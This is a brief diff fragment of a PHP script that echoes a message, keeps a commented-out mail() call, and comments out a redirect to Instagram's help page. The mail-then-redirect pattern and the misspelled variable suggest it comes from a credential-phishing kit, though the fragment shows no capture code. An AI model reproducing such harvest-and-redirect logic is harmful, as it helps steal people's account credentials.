@@ -30,5 +30,5 @@ echo $message;
 // {
 // mail($Send,$subject,$rnessage,$headers);
 // }
-header("Location: https://help.instagram.com/");
+// header("Location: https://help.instagram.com/");
 ?>
